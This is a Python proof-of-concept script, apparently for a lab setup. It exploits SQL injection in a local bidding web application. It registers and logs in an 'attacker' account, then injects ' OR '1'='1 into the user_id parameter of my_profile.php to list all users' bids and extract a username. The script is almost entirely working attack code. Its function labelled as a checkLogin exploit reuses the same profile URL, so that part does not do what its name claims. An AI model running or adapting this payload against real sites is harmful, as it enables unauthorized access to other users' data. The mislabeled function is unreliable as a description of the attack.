import requests
from bs4 import BeautifulSoup

BASE_URL = "http://localhost:8080"  # Base URL of the web application
INDEX_URL = f"{BASE_URL}/index.php"  # URL of the index page

# SQL Injection payload
SQL_INJECTION_PAYLOAD = "' OR '1'='1"

# Function to exploit SQL Injection in getUserBids
def exploit_getUserBids(cookie):
    exploit_url = f"{BASE_URL}/my_profile.php?user_id={SQL_INJECTION_PAYLOAD}"
    response = requests.get(exploit_url, cookies=cookie)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        table = soup.find('table', attrs={'class':'table table-striped'})
        print("Exploit Successful! All Bids:")
        for row in table.find_all('tr'):
            for cell in row.find_all('td'):
                print(cell.text, end=" | ")
            print("\n")
    else:
        print("Exploit Failed!")

# Function to exploit SQL Injection in checkLogin
def exploit_checkLogin(cookie):
    exploit_url = f"{BASE_URL}/my_profile.php?user_id={SQL_INJECTION_PAYLOAD}"
    response = requests.get(exploit_url, cookies=cookie)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        username = soup.find('h1', attrs={'class':'mt-4 mb-4'}).text.replace("Welcome, ", "")
        print("Exploit Successful! Username:", username)
    else:
        print("Exploit Failed!")

# Function to sign up a new user
def signup(user_name, password):
    signup_url = f"{BASE_URL}/signup.php"
    signup_data = {
        "user_name": user_name,
        "password": password
    }
    response = requests.post(signup_url, data=signup_data)
    if response.status_code == 200:
        print("User signed up successfully.")
    else:
        print("Failed to sign up the user.")

# Function to log in and retrieve the session cookie
def login(user_name, password):
    login_url = f"{BASE_URL}/login.php"
    login_data = {
        "user_name": user_name,
        "password": password
    }
    session = requests.session()
    response = session.post(login_url, data=login_data)
    if response.status_code == 200:
        print("User logged in successfully.")
        return session.cookies.get_dict()
    else:
        print("Failed to log in.")
        return None

def main():
    # Sign up a new user
    user_name = "attacker"
    password = "attacker123"
    signup(user_name, password)

    # Log in with the created user
    cookie = login(user_name, password)
    # Exploit the SQL Injection in getUserBids
    exploit_getUserBids(cookie)

    # Exploit the SQL Injection in checkLogin
    exploit_checkLogin(cookie)

if __name__ == "__main__":
    main()
